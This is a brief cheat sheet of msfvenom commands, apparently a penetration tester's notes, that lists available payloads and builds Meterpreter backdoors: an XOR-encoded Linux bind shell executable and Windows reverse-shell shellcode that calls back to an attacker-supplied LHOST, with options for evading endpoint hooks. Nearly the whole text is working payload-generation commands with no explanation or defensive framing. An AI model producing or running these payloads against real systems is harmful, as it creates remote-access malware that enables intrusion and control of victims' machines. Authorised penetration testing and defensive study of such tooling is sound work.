# Lists
```sh
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders
```

# Meterpreter - Linux - bind_tcp
```sh
# --encrypt aes256 does not work for exe and elf
msfvenom -a x64 -e x64/xor_dynamic --platform Linux -p linux/x64/meterpreter/bind_tcp -f elf LPORT=10000 EnableStageEncoding=true -o bind_tcp
```

# Meterpreter - Windows - reverse_tcp
```sh
msfvenom -a x64 --platform Windows -p windows/x64/meterpreter_reverse_tcp LPORT=10000 LHOST=[ip] AutoUnhookProcess=true PingbackSleep=15 -f raw -o shellcode.bin 
```
